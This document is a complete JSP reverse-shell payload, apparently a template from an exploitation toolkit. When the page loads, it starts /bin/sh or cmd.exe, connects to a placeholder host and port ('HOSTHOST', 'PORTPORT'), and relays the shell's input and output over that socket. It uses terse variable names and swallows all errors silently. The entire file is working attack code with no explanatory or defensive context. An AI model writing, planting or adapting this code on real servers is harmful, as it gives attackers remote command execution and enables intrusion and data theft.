<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xr;
    OutputStream zf;

    StreamConnector( InputStream xr, OutputStream zf )
    {
      this.xr = xr;
      this.zf = zf;
    }

    public void run()
    {
      BufferedReader ye  = null;
      BufferedWriter gfu = null;
      try
      {
        ye  = new BufferedReader( new InputStreamReader( this.xr ) );
        gfu = new BufferedWriter( new OutputStreamWriter( this.zf ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ye.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gfu.write( buffer, 0, length );
          gfu.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ye != null )
          ye.close();
        if( gfu != null )
          gfu.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "HOSTHOST", PORTPORT );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
